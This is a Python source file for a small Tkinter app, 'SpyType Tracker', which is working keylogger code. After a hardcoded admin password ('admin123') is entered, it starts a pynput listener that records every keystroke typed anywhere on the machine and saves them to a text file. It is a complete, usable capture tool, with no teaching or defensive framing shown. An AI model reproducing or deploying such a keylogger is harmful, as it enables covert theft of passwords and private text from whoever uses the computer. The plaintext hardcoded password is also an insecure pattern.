import tkinter as tk
from tkinter import messagebox, simpledialog
from pynput import keyboard

class KeyLoggerGUI:
    def __init__(self, root):
        # Initialize the GUI window
        self.root = root
        self.root.title("SpyType Tracker-Keystrokes Capturing")  # Set window title

        # Admin password for access control
        self.admin_password = "admin123"  

        # Login button to log in as admin
        self.login_button = tk.Button(self.root, text="Login as Admin", command=self.login_as_admin, font=("Helvetica", 12))
        self.login_button.pack(pady=10)

        # Button to start the keylogger (disabled initially)
        self.start_button = tk.Button(self.root, text="Start Keylogger", command=self.start_keylogger, state=tk.DISABLED, font=("Helvetica", 12))
        self.start_button.pack(pady=10)

        # Button to stop the keylogger (disabled initially)
        self.stop_button = tk.Button(self.root, text="Stop Keylogger", command=self.stop_keylogger, state=tk.DISABLED, font=("Helvetica", 12))
        self.stop_button.pack(pady=10)

        # Label to display the status of the keylogger
        self.status_label = tk.Label(self.root, text="Keylogger is not active", font=("Helvetica", 14, "italic"))
        self.status_label.pack(pady=15)

        # List to store captured keystrokes
        self.key_list = []

        # Flag to indicate if keylogging is active
        self.is_logging = False

        # Listener object for capturing keystrokes
        self.listener = None

    def login_as_admin(self):
        # Function to log in as admin
        entered_password = simpledialog.askstring("Admin Login", "Enter Admin Password:", show='*')
        if entered_password == self.admin_password:
            # Enable keylogger controls if admin login successful
            self.status_label.config(text="Admin logged in")
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.NORMAL)
            self.login_button.config(state=tk.DISABLED)
        else:
            # Display error message for incorrect password
            messagebox.showerror("Login Failed", "Incorrect password. Try again.")

    def start_keylogger(self):
        # Function to start the keylogger
        if self.is_admin_logged_in():
            self.is_logging = True

            # Callback function for key press event
            def on_press(key):
                if self.is_logging:
                    self.key_list.append(str(key))

            # Callback function for key release event
            def on_release(key):
                if key == keyboard.Key.esc:
                    self.stop_keylogger()
                    return False

            # Start the keylogger listener
            self.listener = keyboard.Listener(on_press=on_press, on_release=on_release)
            self.listener.start()

            # Update status label
            self.status_label.config(text="Keylogger is active")

    def stop_keylogger(self):
        # Function to stop the keylogger
        if self.is_admin_logged_in():
            entered_password = simpledialog.askstring("Admin Password", "Enter Admin Password to Stop Keylogger:", show='*')
            if entered_password == self.admin_password:
                # Stop keylogger if admin password is correct
                self.is_logging = False

                # Stop the listener and join the thread
                self.listener.stop()
                self.listener.join()

                # Write captured keystrokes to a file
                with open('logs.txt', 'w') as log_file:
                    log_file.write('\n'.join(self.key_list))

                # Reset key list and update status label
                self.key_list = []
                self.status_label.config(text="Keylogger is not active")

                # Disable keylogger controls and enable login button
                self.start_button.config(state=tk.DISABLED)
                self.stop_button.config(state=tk.DISABLED)
                self.login_button.config(state=tk.NORMAL)
            else:
                # Display error message for incorrect admin password
                messagebox.showerror("Access Denied", "Incorrect admin password. Keylogger not stopped.")

    def is_admin_logged_in(self):
        # Function to check if admin is logged in
        if self.login_button["state"] == tk.DISABLED:
            return True
        else:
            # Display error message if admin login is required
            messagebox.showerror("Access Denied", "Admin login required.")
            return False

# Create the root window
root = tk.Tk()
root.geometry("400x400")  # Set the size of the window

# Initialize the KeyLoggerGUI object
keylogger_gui = KeyLoggerGUI(root)

# Run the main event loop
root.mainloop()
